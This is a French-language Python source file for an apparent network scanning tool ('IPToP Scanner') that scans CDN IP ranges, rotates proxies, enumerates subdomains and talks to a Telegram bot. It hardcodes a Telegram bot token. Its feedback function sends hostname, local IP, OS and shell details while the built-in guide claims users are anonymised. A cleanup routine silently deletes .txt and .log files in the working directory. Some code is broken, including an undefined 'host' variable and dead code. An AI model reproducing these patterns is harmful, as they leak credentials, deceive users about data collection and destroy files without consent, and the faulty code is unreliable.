    print(Fore.CYAN + " 04. üßæ  G√©rer les fichiers textes")
    print(Fore.CYAN + " 05. üõ∞Ô∏è  G√©rer les proxies")

    # Fournisseurs cloud
    print(Fore.GREEN + "\n‚ï≠‚îÄ‚îÄ‚îÄ Analyse des fournisseurs CDN / Cloud ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ")
    print(Fore.CYAN + " 06. ‚òÅÔ∏è    Cloudflare")
    print(Fore.CYAN + " 07. üì¶   CloudFront")
    print(Fore.CYAN + " 08. ‚òÅÔ∏è    Google Cloud")
    print(Fore.CYAN + " 09. ‚ö°   Fastly")
    print(Fore.CYAN + " 10. üõ∞Ô∏è    Akamai")
    print(Fore.CYAN + " 11. ‚òÅÔ∏è    Azure")
    print(Fore.CYAN + " 12. üåê   StackPath")
    print(Fore.CYAN + " 13. üåç   GCore")
    
    # Assistance
    print(Fore.BLUE + "\n‚ï≠‚îÄ‚îÄ‚îÄ Assistance & Aide ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ")
    print(Fore.CYAN + " 98. üßº Nettoyer le dossier temporaire (.tmp)")
    print(Fore.CYAN + " 99. üì¨  Messagerie & Aide")

    # Quitter
    print(Fore.RED + "\n‚ï≠‚îÄ‚îÄ‚îÄ Sortie ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ")
    print(Fore.RED + Style.BRIGHT + " 00. ‚ùå  Quitter" + Style.RESET_ALL)

    print(Fore.MAGENTA + "\n" + "‚ïê"*52)
    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option (00-99) : ")
    return choice
# ==============================================
    
def text_file_menu():
    print(Fore.LIGHTMAGENTA_EX + "\nüßæ GESTION DES FICHIERS TEXTES")
    print(Fore.LIGHTMAGENTA_EX + "-" * 48)

    print(Fore.CYAN + " 1. ‚úÇÔ∏è  Fractionner un fichier texte")
    print(Fore.CYAN + " 2. üîó Fusionner plusieurs fichiers")
    print(Fore.CYAN + " 3. üßπ Supprimer les doublons")
    print(Fore.CYAN + " 4. üßÆ S√©parer domaines et IP")
    print(Fore.CYAN + " 5. üìÇ R√©organiser par extensions")
    print(Fore.CYAN + " 6. üåê Convertir domaine en IP")
    print(Fore.CYAN + " 7. ‚ÜïÔ∏è  Trier domaines ou IP")
    print(Fore.CYAN + " 8. üìç Convertir CIDR en IP")
    print(Fore.CYAN + " 9. üïµÔ∏è  Extraire domaines & IP depuis un fichier")
    print(Fore.CYAN + " 0. ‚Ü©Ô∏è  Retour au menu principal")

    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option (0-9) : ")
    return choice
    
def proxy_menu():
    print(Fore.LIGHTBLUE_EX + "\nüõ∞Ô∏è  GESTION DES PROXIES")
    print(Fore.LIGHTBLUE_EX + "=" * 40)

    print(Fore.CYAN + " 1. ‚ôªÔ∏è  Mettre √† jour la liste des proxies")
    print(Fore.CYAN + " 2. üéØ S√©lectionner un proxy")
    print(Fore.CYAN + " 3. ‚úÖ Afficher les proxies valides")
    print(Fore.CYAN + " 4. üîé V√©rifier les proxies existants")
    print(Fore.CYAN + " 5. ‚Ü©Ô∏è Retour au menu principal")

    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-5) : ")
    return choice

# ==============================================
# FONCTIONS 'UTILITAIRES
# ==============================================

def format_url(host):
    if not host.startswith("http://") and not host.startswith("https://"):
        return f"http://{host}"
    return host

def menu_messagerie():
    while True:
        print(Fore.MAGENTA + "\n‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó")
        print(Fore.MAGENTA + "‚ïë" + Fore.CYAN + Style.BRIGHT + "         üì¨ MESSAGERIE & AIDE INTERACTIVE        " + Style.RESET_ALL + Fore.MAGENTA + "‚ïë")
        print(Fore.MAGENTA + "‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\n")

        print(Fore.CYAN + " 1. ‚úâÔ∏è  Envoyer un message √† l‚Äôauteur")
        print(Fore.CYAN + " 2. üìñ Lire le guide / aide int√©gr√©e")
        print(Fore.CYAN + " 3. ü§ñ Lire les derniers messages du bot Telegram")
        print(Fore.CYAN + " 4. üí¨ Poser une question au bot assistant")
        print(Fore.CYAN + " 5. üóÇÔ∏è  Voir l‚Äôhistorique des questions")
        print(Fore.CYAN + " 6. üßº R√©initialiser l‚Äôhistorique")
        print(Fore.CYAN + " 0. ‚Ü©Ô∏è  Retour au menu principal")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option : ").strip()

        if choice == "1":
            send_feedback_to_telegram()
        elif choice == "2":
            readme()
            input(Fore.MAGENTA + "\nAppuie sur Entr√©e pour continuer...")
        elif choice == "3":
            lire_messages_du_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entr√©e pour continuer...")
        elif choice == "4":
            parler_au_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entr√©e pour continuer...")
        elif choice == "5":
            voir_historique_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entr√©e pour continuer...")
        elif choice == "6":
            reinitialiser_historique_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entr√©e pour continuer...")
        elif choice == "0":
            break
        else:
            print(Fore.RED + "‚ùå Option invalide.")

def parler_au_bot():
    print(Fore.CYAN + "\nü§ñ Pose ta question au bot (ex : option 1, cloudflare, help)")
    question = input(Fore.YELLOW + "Ta question : ").strip()

    if not question:
        print(Fore.RED + "‚ùå Question vide.")
        return

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    CHAT_ID = "5950978436"

    url_send = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    url_get = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"

    try:
        requests.post(url_send, data={"chat_id": CHAT_ID, "text": question})
    except Exception as e:
        print(Fore.RED + f"Erreur d'envoi : {e}")
        return

    print(Fore.BLUE + "\n‚åõ Attente de la r√©ponse du bot...")

    response = None
    for _ in range(15):
        time.sleep(1)
        try:
            url = format_url(host)
            r = requests.get(url, timeout=5)
            updates = r.json().get("result", [])
            if updates:
                last = updates[-1].get("message", {}).get("text", "")
                if last and last != question and last != response:
                    response = last
                    print(Fore.GREEN + "\nü§ñ R√©ponse du bot :\n" + Fore.RESET + response)
                    break
        except:
            pass

    if not response:
        print(Fore.RED + "‚è±Ô∏è Aucune r√©ponse du bot re√ßue.")
        response = "Aucune r√©ponse re√ßue."

    # Logging
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{now}]\nQuestion : {question}\nR√©ponse : {response}\n\n"

    try:
        with open(".ipt_bot.log", "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(Fore.RED + f"Erreur lors de l‚Äô√©criture dans .ipt_bot.log : {e}")

    try:
        os.makedirs("logs", exist_ok=True)
        filename = datetime.now().strftime("logs/botlog_%Y-%m-%d_%H-%M.txt")
        with open(filename, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(Fore.RED + f"Erreur lors de la sauvegarde dans les logs : {e}")

def lire_messages_du_bot():
    print(Fore.CYAN + "\nüì¨ R√©cup√©ration des derniers messages du bot...\n")

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"

    try:
        r = requests.get(url, timeout=10)
        updates = r.json()

        messages = []
        for update in updates.get("result", [])[-5:]:  # Derniers 5 messages
            msg = update.get("message", {}).get("text", "")
            if msg:
                messages.append(msg)

        if not messages:
            print(Fore.YELLOW + "Aucun message trouv√©.")
            return

        print(Fore.GREEN + "=== R√©ponses du bot ===\n")
        for i, msg in enumerate(messages, 1):
            print(f"{Fore.MAGENTA}[{i}] {Fore.RESET}{msg}\n")
    except Exception as e:
        print(Fore.RED + f"Erreur : impossible de lire les messages. {e}")

def voir_historique_bot():
    log_path = ".ipt_bot.log"
    
    if not os.path.exists(log_path):
        print(Fore.YELLOW + "\nüì≠ Aucun historique trouv√© pour le moment.")
        return

    print(Fore.CYAN + "\n=== Historique des questions au bot ===\n")
    
    try:
        with open(log_path, "r", encoding="utf-8") as f:
            lignes = f.readlines()

        bloc = []
        for line in lignes:
            if line.startswith("["):
                if bloc:
                    afficher_bloc_bot(bloc)
                    bloc = []
            bloc.append(line)
        if bloc:
            afficher_bloc_bot(bloc)

    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur de lecture du fichier : {e}")

def afficher_bloc_bot(bloc):
    for line in bloc:
        if line.startswith("["):
            print(Fore.YELLOW + line.strip())
        elif line.startswith("Question"):
            print(Fore.BLUE + line.strip())
        elif line.startswith("R√©ponse"):
            print(Fore.GREEN + line.strip())
        else:
            print(Fore.RESET + line.strip())
    print(Fore.MAGENTA + "-" * 40)

def reinitialiser_historique_bot():
    log_path = ".ipt_bot.log"
    
    if not os.path.exists(log_path):
        print(Fore.YELLOW + "\nüì≠ Aucun fichier d‚Äôhistorique √† supprimer.")
        return

    confirm = input(Fore.RED + "‚ö†Ô∏è Es-tu s√ªr de vouloir supprimer tout l‚Äôhistorique ? (o/n) : ").strip().lower()
    if confirm == "o":
        try:
            os.remove(log_path)
            print(Fore.GREEN + "üßπ Historique supprim√© avec succ√®s.")
        except Exception as e:
            print(Fore.RED + f"‚ùå √âchec de la suppression : {e}")
    else:
        print(Fore.CYAN + "‚úÖ Annul√©. L‚Äôhistorique est conserv√©.")

def readme():
    print(Fore.GREEN + "\nBienvenue dans IPToP Scanner ‚Äì Internet Pour Tous Ou Personne.")
    print(Fore.YELLOW + "\n=== AIDE / GUIDE D‚ÄôUTILISATION ===\n")
    
    print(Fore.CYAN + "1. Scanner une plage d‚ÄôIP :")
    print("   > Scanne tous les h√¥tes d‚Äôun r√©seau (ex: 192.168.1.0/24) pour d√©tecter ceux qui sont actifs.")
    print("   > Supporte le mode proxy automatique et le mode turbo pour plus de rapidit√©.")

    print(Fore.CYAN + "\n2. Scanner √† partir d‚Äôun fichier :")
    print("   > Charge une liste d‚ÄôIP ou de domaines depuis un fichier et les scanne.")
    print("   > Pratique pour les scans cibl√©s.")

    print(Fore.CYAN + "\n3. Recherche de domaines :")
    print("   > R√©cup√®re les sous-domaines d‚Äôun domaine donn√© via des sources publiques.")
    print("   > R√©sout ensuite les IPs associ√©es si tu le souhaites.")

    print(Fore.CYAN + "\n4. G√©rer les fichiers textes :")
    print("   > Outils pour fractionner, fusionner, nettoyer, convertir, trier et manipuler des fichiers contenant IPs / domaines.")
    print("   > Parfait pour pr√©parer ou analyser des listes personnalis√©es.")

    print(Fore.CYAN + "\n5. G√©rer les proxies :")
    print("   > Met √† jour la liste des proxies, les valide et permet d‚Äôen s√©lectionner un manuellement ou automatiquement.")
    print("   > Le mode turbo utilise plus de threads pour des scans rapides.")

    print(Fore.CYAN + "\n6. Scanner Cloudflare :")
    print("   > Scanne les plages CIDR connues de Cloudflare √† la recherche d‚Äôh√¥tes expos√©s.")
    print("   > Gestion de la reprise automatique et historique de scan.")

    print(Fore.CYAN + "\n7. Scanner CloudFront :")
    print("   > Identique √† Cloudflare mais cibl√© sur les plages IP d‚ÄôAmazon CloudFront.")

    print(Fore.CYAN + "\n8. Envoyer un message √† l‚Äôauteur :")
    print("   > Ouvre un champ libre pour donner ton avis, signaler un bug ou poser une question.")
    print("   > Ton identifiant est anonymis√© automatiquement.")

    print(Fore.CYAN + "\n9. Lire ce guide :")
    print("   > Ce que tu es en train de lire maintenant.")

    print(Fore.CYAN + "\n10. Lire les r√©ponses du bot :")
    print("   > Affiche les derniers messages d‚Äôaide publi√©s en direct depuis Telegram.")

    print(Fore.CYAN + "\n0. Quitter :")
    print("   > Ferme le programme proprement.")

    print(Fore.YELLOW + "\n===============================\n")

def get_or_create_user_id():
    uid_file = os.path.expanduser("~/.ipt_uid")
    if os.path.exists(uid_file):
        with open(uid_file, "r") as f:
            return f.read().strip()

    raw = platform.node() + platform.machine() + os.getenv("SHELL", "")
    hash_uid = hashlib.sha256(raw.encode()).hexdigest()[:10]

    with open(uid_file, "w") as f:
        f.write(hash_uid)

    return hash_uid

def increment_feedback_count():
    counter_file = os.path.expanduser("~/.ipt_feedback_count")
    count = 0
    if os.path.exists(counter_file):
        try:
            with open(counter_file, "r") as f:
                count = int(f.read().strip())
        except:
            pass
    count += 1
    with open(counter_file, "w") as f:
        f.write(str(count))
    return count

def send_feedback_to_telegram():
    print(Fore.CYAN + "\nüìù Entrez votre message pour l‚Äôauteur.")
    print(Fore.YELLOW + "(Appuyez sur Entr√©e vide pour envoyer)\n")

    lines = []
    while True:
        line = input()
        if not line.strip():
            break
        lines.append(line)

    message = "\n".join(lines).strip()
    if not message:
        return

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        ip_local = socket.gethostbyname(socket.gethostname())
    except:
        ip_local = "inconnue"

    system_id = platform.node() or "non d√©fini"
    system_type = platform.system()
    os_version = platform.release()
    arch = platform.machine()
    shell = os.getenv("SHELL", "inconnu")

    user_id = get_or_create_user_id()
    feedback_count = increment_feedback_count()

    formatted = (
        f"üì© Message utilisateur IPToP\n"
        f"üïí {now}\n"
        f"üÜî UID : {user_id} | Feedback #{feedback_count}\n"
        f"üåê IP locale : {ip_local}\n"
        f"üñ•Ô∏è Appareil : {system_id}\n"
        f"üß† OS : {system_type} {os_version} | Arch : {arch}\n"
        f"üìü Shell : {shell}\n\n"
        f"{message}"
    )

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    CHAT_ID = "5950978436"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": formatted
    }

    try:
        r = requests.post(url, data=payload, timeout=10)
        if r.status_code == 200:
            print(Fore.GREEN + "‚úÖ Message envoy√© avec succ√®s !")
            print(Fore.CYAN + "\n‚úâÔ∏è Merci pour votre retour.")
    except:
        pass

def clean_unwanted_logs():
    """Nettoie discr√®tement les fichiers inutiles et anciens du dossier courant."""
    dossier = os.getcwd()
    extensions_cibles = (".log", ".tmp", ".bak", ".txt")
    noms_fixes = {"log_bot", ".ipt_bot.log", "launcher.log", "last_error.txt"}
    maintenant = time.time()
    age_max = 48 * 3600  # 48 heures

    try:
        for nom in os.listdir(dossier):
            chemin = os.path.join(dossier, nom)
            if os.path.isfile(chemin):
                if nom in noms_fixes or nom.endswith(extensions_cibles):
                    age = maintenant - os.path.getmtime(chemin)
                    if age > age_max or nom in noms_fixes:
                        os.remove(chemin)
            elif os.path.isdir(chemin) and nom == "logs":
                for sous_fichier in os.listdir(chemin):
                    try:
                        sf_path = os.path.join(chemin, sous_fichier)
                        if os.path.isfile(sf_path) and (maintenant - os.path.getmtime(sf_path)) > age_max:
                            os.remove(sf_path)
                    except:
                        pass
                try:
                    os.rmdir(chemin)  # Supprime le dossier si vide
                except:
                    pass
    except:
        pass  # Silencieux

def lancer_scan_ips_resolues():
    ip_file = "ips_resolues.txt"
    if not os.path.exists(ip_file):
        print(Fore.RED + "‚ùå Aucun fichier d'IPs r√©solues trouv√©. Lance d'abord une r√©solution DNS.")
        return

    threads = int(input("Nombre de threads (10-500) : ") or "100")
    proxy = get_proxy_config()
    turbo = False
    if proxy == "auto":
        turbo = input("Activer le mode turbo pour proxy ? (o/n) : ").lower() == 'o'

    scanner = HostScanner(
        filename=ip_file,
        threads=threads,
        proxy=proxy,
        turbo_mode=turbo
    )
    scanner.run()

def resoudre_dns_depuis_fichier():
    print(Fore.CYAN + "\nüåê R√©solution DNS depuis un fichier")

    chemin = input(Fore.YELLOW + "Chemin du fichier contenant les domaines : ").strip()
    if not os.path.exists(chemin):
        print(Fore.RED + "‚ùå Fichier introuvable.")
        return

    with open(chemin, 'r') as f:
        domaines = [line.strip() for line in f if line.strip()]

    if not domaines:
        print(Fore.RED + "‚ùå Aucun domaine valide trouv√©.")
        return

    # Choix de la m√©thode de r√©solution
    print(Fore.LIGHTBLUE_EX + "\nM√©thode de r√©solution DNS :")
    print(Fore.CYAN + " 1. Standard (rapide, non anonyme)")
    print(Fore.CYAN + " 2. DNS over HTTPS via Cloudflare (anonyme)")
    print(Fore.CYAN + " 3. DNS over HTTPS via Google (anonyme)")
    print(Fore.CYAN + " 4. R√©solution hybride (locale + DoH en secours)")

    dns_choice = input(Fore.YELLOW + "\n>>> Choix (1-4) : ").strip()

    if dns_choice == "1":
        resolver_fn = resolve_ip_simple
    elif dns_choice == "2":
        resolver_fn = resolve_ip_cloudflare
    elif dns_choice == "3":
        resolver_fn = resolve_ip_google
    elif dns_choice == "4":
        resolver_fn = resolve_ip_hybride
    else:
        print(Fore.RED + "‚ùå Choix invalide.")
        return

    ip_file = "resolved_ips.txt"
    resolve_and_save_ips(domaines, ip_file, resolver_fn)

def search_and_save_domains(domain, output_file):
    """Effectue les recherches passives et sauvegarde les domaines trouv√©s"""
    print(Fore.CYAN + "\nüîç Recherche en cours (sources: Hackertarget, crt.sh, Subfinder)...")

    results = {
        "Hackertarget": get_domains_from_hackertarget(domain),
        "crt.sh": get_domains_from_crtsh(domain),
        "Subfinder": get_domains_from_subfinder(domain)
    }

    all_domains = set()
    for src, lst in results.items():
        print(Fore.CYAN + f"‚ñ™ Tentative avec {src}..." + Fore.GREEN + f"‚úì {len(lst)} domaines valides")
        all_domains.update(lst)

    print(Fore.GREEN + f"\n‚úÖ Total de domaines valides: {len(all_domains)}")

    with open(output_file, 'w') as f:
        for d in sorted(all_domains):
            f.write(d + "\n")

    print(Fore.GREEN + f"‚úì R√©sultats sauvegard√©s dans {output_file}")
    return sorted(all_domains)

def domain_tools_menu():
    while True:
        print(Fore.LIGHTMAGENTA_EX + "\n‚ï≠‚îÄ‚îÄ‚îÄ OUTILS DE RECHERCHE DE DOMAINES ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ")
        print(Fore.CYAN + " 1. üîé Recherche passive (API externes)")
        print(" 2. üï∏Ô∏è  Analyse de page web")
        print(" 3. ‚ö° Combiner les deux m√©thodes")
        print(" 4. üåê R√©soudre les DNS et trouver les IPs")
        print(" 5. üöÄ Scanner les IPs r√©solues")
        print(" 6. üîô Retour au menu principal")
        print(Fore.LIGHTMAGENTA_EX + "‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïØ")
        sub_choice = input(Fore.YELLOW + ">>> Choix (1-6) : ").strip()

        if sub_choice == "1":
            domaine = input("Entrez le nom de domaine principal (ex : example.com) : ").strip()
            if domaine:
                find_domains(domaine)

        elif sub_choice == "2":
            analyse_page_web()

        elif sub_choice == "3":
            print(Fore.CYAN + "\n‚ö° Combinaison de la recherche passive et de l‚Äôanalyse web")
            domaine = input(Fore.YELLOW + "Entrez le nom de domaine principal (ex : example.com) : ").strip()
            if domaine:
                print(Fore.CYAN + "üîé Recherche passive...")
                find_domains(domaine)
                print(Fore.CYAN + "\nüï∏Ô∏è Analyse de page web...")
                analyse_page_web(target=domaine)

        elif sub_choice == "4":
            resoudre_dns_depuis_fichier()

        elif sub_choice == "5":
            scan_resolved_ips()

        elif sub_choice == "6":
            return "retour"

        else:
            print(Fore.RED + "‚ùå Option invalide.")
            
def is_valid_domain(domain):
    """Valide strictement un nom de domaine"""
    if not domain or '*' in domain:
        return False
    
    # V√©rifie la longueur totale
    if len(domain) > 253:
        return False
    
    # V√©rifie chaque partie
    parts = domain.split('.')
    if len(parts) < 2:  # Au moins un sous-domaine et un TLD
        return False
    
    for part in parts:
        if not part or len(part) > 63:
            return False
        if not re.match(r'^[a-z0-9-]+$', part):
            return False
        if part.startswith('-') or part.endswith('-'):
            return False
    
    return True

def get_domains_from_hackertarget(domain):
    import requests
    url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
    try:
        resp = requests.get(url, timeout=10)
        lines = resp.text.splitlines()
        domains = [line.split(',')[0].strip() for line in lines if ',' in line]
        return list(set(domains))
    except Exception as e:
        print(Fore.RED + f"‚ùå Hackertarget erreur: {e}")
        return []
        
def get_domains_from_crtsh(domain):
    import requests, re
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        resp = requests.get(url, timeout=15)
        entries = resp.json()
        raw_domains = [entry['name_value'] for entry in entries if 'name_value' in entry]
        all_domains = set()
        for item in raw_domains:
            for d in item.split('\n'):
                if domain in d:
                    all_domains.add(d.strip())
        return list(all_domains)
    except Exception as e:
        print(Fore.RED + f"‚ùå crt.sh erreur: {e}")
        return []
        
def get_domains_from_subfinder(domain):
    import subprocess
    try:
        result = subprocess.run(['subfinder', '-d', domain, '-silent'], capture_output=True, text=True, timeout=15)
        domains = result.stdout.splitlines()
        return list(set(domains))
    except Exception as e:
        print(Fore.RED + f"‚ùå Subfinder erreur: {e}")
        return []

def resolve_standard(domain):
    try:
        answer = dns.resolver.resolve(domain, 'A')
        return str(answer[0])
    except:
        try:
            return socket.gethostbyname(domain)
        except:
            return None

def resolve_doh_cloudflare(domain):
    try:
        url = f"https://cloudflare-dns.com/dns-query?name={domain}&type=A"
        headers = {'accept': 'application/dns-json'}
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            for ans in data.get("Answer", []):
                if ans.get("type") == 1:
                    return ans["data"]
    except:
        return None

def resolve_doh_google(domain):
    try:
        url = f"https://dns.google/resolve?name={domain}&type=A"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            for ans in data.get("Answer", []):
                if ans.get("type") == 1:
                    return ans["data"]
    except:
        return None
        
    # Choix du r√©solveur
    resolver_func = resolve_standard if mode == "1" else (
        resolve_doh_cloudflare if mode == "2" else resolve_doh_google
    )

import ipaddress

def is_valid_ip(ip):
    """V√©rifie si une cha√Æne est une adresse IPv4 valide"""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def find_domains(domain):
    domain_file = f"{domain}_domains.txt"
    ip_file = f"{domain}_ips.txt"

    # V√©rifier si le fichier de domaines existe
    if os.path.exists(domain_file):
        reuse = input(Fore.YELLOW + f"\nUn fichier {domain_file} existe d√©j√†.\nSouhaitez-vous le r√©utiliser sans relancer la recherche ? (o/n) : ").lower()
        if reuse == "o":
            with open(domain_file, 'r') as f:
                valid_domains = {line.strip() for line in f if line.strip()}
            print(Fore.GREEN + f"‚úì {len(valid_domains)} domaines charg√©s depuis {domain_file}")
        else:
            valid_domains = search_and_save_domains(domain, domain_file)
    else:
        valid_domains = search_and_save_domains(domain, domain_file)

    if not valid_domains:
        print(Fore.RED + "‚ùå Aucun sous-domaine valide trouv√©.")
        return

    # Sauvegarde (√©vite double √©criture plus bas)
    with open(domain_file, 'w') as f:
        for d in sorted(valid_domains):
            f.write(d + "\n")
    print(Fore.GREEN + f"‚úì R√©sultats sauvegard√©s dans {domain_file}")

    # R√©solution DNS ?
    if input("\nSouhaitez-vous r√©soudre les domaines en IPs maintenant ? (o/n) : ").lower() == "o":
        print(Fore.CYAN + "\nM√©thode de r√©solution disponible :")
        print("1. Standard (DNS local)")
        print("2. DNS over HTTPS via Cloudflare")
        print("3. DNS over HTTPS via Google")
        mode = input(">>> Choix (1-3) : ").strip()

        def resolve_standard(domain):
            try:
                return str(dns.resolver.resolve(domain, 'A')[0])
            except:
                try:
                    return socket.gethostbyname(domain)
                except:
                    return None

        def resolve_doh_cloudflare(domain):
            try:
                url = f"https://cloudflare-dns.com/dns-query?name={domain}&type=A"
                headers = {'accept': 'application/dns-json'}
                r = requests.get(url, headers=headers, timeout=5)
                for ans in r.json().get("Answer", []):
                    if ans.get("type") == 1:
                        return ans["data"]
            except:
                return None

        def resolve_doh_google(domain):
            try:
                url = f"https://dns.google/resolve?name={domain}&type=A"
                r = requests.get(url, timeout=5)
                for ans in r.json().get("Answer", []):
                    if ans.get("type") == 1:
                        return ans["data"]
            except:
                return None

        def is_valid_ip(ip):
            try:
                socket.inet_aton(ip)
                return True
            except:
                return False

        resolver_func = resolve_standard if mode == "1" else (
            resolve_doh_cloudflare if mode == "2" else resolve_doh_google
        )
        resolve_and_save_ips(valid_domains, ip_file, resolver_func)

        if input("\nSouhaitez-vous scanner maintenant les IPs r√©solues ? (o/n) : ").lower() == "o":
            scan_resolved_ips(ip_file)

    # Scan domaines ?
    if input("\nSouhaitez-vous scanner √©galement les sous-domaines ? (o/n) : ").lower() == "o":
        scan_domains_file(domain)  # On envoie seulement le domaine, pas le nom du fichier
        
def run_subfinder(domain):
    """Ex√©cute Subfinder avec gestion d'erreur d√©taill√©e"""
    try:
        result = subprocess.run(
            ['subfinder', '-d', domain, '-silent'],
            capture_output=True,
            text=True,
            timeout=300  # 5 minutes max
        )
        
        if result.returncode != 0:
            raise Exception(f"Erreur Subfinder (code {result.returncode}): {result.stderr}")
            
        return [line.strip().lower() for line in result.stdout.splitlines() if line.strip()]
        
    except FileNotFoundError:
        print(Fore.RED + "‚ùå Subfinder non install√©. Installez-le avec 'pkg install subfinder'")
        return []
    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur Subfinder: {str(e)}")
        return []
        
def fetch_domains_from_source(url, handler, timeout, source_name):
    """R√©cup√®re les domaines depuis une source sp√©cifique"""
    try:
        response = requests.get(url, timeout=timeout)
        response.raise_for_status()
        
        # Ajout du nom de la source pour les logs
        setattr(response, 'source_name', source_name)
        return handler(response)
    except Exception as e:
        setattr(e, 'source_name', source_name)
        raise e

def scan_resolved_ips(ip_file="resolved_ips.txt"):
    if not os.path.exists(ip_file):
        print(Fore.RED + f"‚ùå Fichier introuvable : {ip_file}")
        return

    with open(ip_file, 'r') as f:
        ips = [line.strip() for line in f if line.strip()]

    if not ips:
        print(Fore.YELLOW + "‚ö†Ô∏è Aucun IP valide √† scanner.")
        return

    try:
        threads = int(input("Nombre de threads (10-500) : "))
        threads = max(10, min(500, threads))
    except:
        print(Fore.RED + "‚ùå Valeur invalide.")
        return

    proxy = get_proxy_config()
    turbo = False
    if proxy == "auto":
        turbo = input("Activer le mode turbo pour proxy ? (o/n) : ").lower() == "o"

    scanner = HostScanner(
        filename=ip_file,
        threads=threads,
        proxy=proxy,
        turbo_mode=turbo
    )
    scanner.run()

def configure_proxy():
    """Configure le proxy avec gestion des erreurs"""
    use_proxy = input("Utiliser un proxy? (o/n/auto) : ").lower()
    if use_proxy == 'n':
        return None
    
    try:
        if use_proxy == 'auto':
            proxy_manager = ProxyManager()
            proxy_manager.load_proxies()
            proxy_list = proxy_manager.get_best_proxies(limit=3)
            if proxy_list:
                proxy = proxy_list[0].split('|')[0].strip()
                print(Fore.GREEN + f"üîÅ Utilisation du proxy: {proxy}")
                return {"http": proxy, "https": proxy}
        
        elif use_proxy == 'o':
            proxy = select_proxy_interactive()
            if proxy:
                return {"http": proxy, "https": proxy}
                
    except Exception as e:
        print(Fore.YELLOW + f"‚ö†Ô∏è Erreur de configuration proxy: {str(e)}")
    
    return None

def save_results(url, results):
    """Sauvegarde les r√©sultats d'analyse de mani√®re optimis√©e sans doublons"""
    if not results.get('domains') and not results.get('ips'):
        print(Fore.YELLOW + "‚ö†Ô∏è Aucun r√©sultat √† sauvegarder")
        return None

    try:
        # Pr√©paration du nom de fichier
        parsed_url = urlparse(url)
        domain_part = parsed_url.netloc.replace('.', '_')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"web_analysis_{domain_part}_{timestamp}.txt"

        # √âcriture s√©curis√©e des r√©sultats
        with open(filename, 'w', encoding='utf-8') as f:
